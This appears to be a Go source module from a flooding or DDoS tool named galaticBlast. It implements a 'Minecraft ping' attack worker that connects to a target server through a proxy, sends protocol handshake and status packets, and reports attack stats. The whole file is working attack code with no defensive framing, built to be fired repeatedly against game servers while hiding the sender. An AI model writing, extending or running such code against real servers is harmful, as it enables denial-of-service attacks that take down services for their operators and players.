package game

import (
	"context"
	"encoding/binary"
	"fmt"
	"time"

	"github.com/galaticBlast/galaticBlast/internal/engine"
	"github.com/galaticBlast/galaticBlast/internal/netutil"
)

type MinecraftPingWorker struct{}

func NewMinecraftPingWorker() *MinecraftPingWorker {
	return &MinecraftPingWorker{}
}

func (w *MinecraftPingWorker) Fire(ctx context.Context, params engine.AttackParams, proxy engine.Proxy, userAgent string, logCh chan<- engine.AttackStats) error {
	port := params.TargetNode.Port
	if port == 0 || port == 80 || port == 443 {
		port = 25565
	}

	conn, err := netutil.DialedTCPClient("tcp", params.TargetNode.Host, port, proxy)
	if err != nil {
		engine.SendAttackLogIfVerbose(params.Verbose, logCh, "minecraft connect failed: "+err.Error())
		return nil
	}
	defer conn.Close()

	conn.SetDeadline(time.Now().Add(3 * time.Second))

	handshake := buildHandshakePacket(params.TargetNode.Host, port)
	if _, err := conn.Write(handshake); err != nil {
		engine.SendAttackLogIfVerbose(params.Verbose, logCh, "minecraft handshake failed: "+err.Error())
		return nil
	}

	statusRequest := []byte{0x01, 0x00}
	if _, err := conn.Write(statusRequest); err != nil {
		engine.SendAttackLogIfVerbose(params.Verbose, logCh, "minecraft status request failed: "+err.Error())
		return nil
	}

	buf := make([]byte, 256)
	conn.Read(buf)

	engine.SendAttackLogIfVerbose(params.Verbose, logCh, "minecraft ping sent successfully")
	return nil
}

func buildHandshakePacket(host string, port int) []byte {
	protocolVersion := encodeVarInt(754)
	serverAddress := encodeString(host)
	serverPort := make([]byte, 2)
	binary.BigEndian.PutUint16(serverPort, uint16(port))
	nextState := encodeVarInt(1)

	payload := append(protocolVersion, serverAddress...)
	payload = append(payload, serverPort...)
	payload = append(payload, nextState...)

	packetID := []byte{0x00}
	fullPayload := append(packetID, payload...)

	length := encodeVarInt(len(fullPayload))
	return append(length, fullPayload...)
}

func encodeVarInt(value int) []byte {
	var result []byte
	for {
		byteVal := byte(value & 0x7F)
		value >>= 7
		if value != 0 {
			byteVal |= 0x80
		}
		result = append(result, byteVal)
		if value == 0 {
			break
		}
	}
	return result
}

func encodeString(s string) []byte {
	length := encodeVarInt(len(s))
	return append(length, []byte(s)...)
}

func init() {
	_ = fmt.Sprintf
}
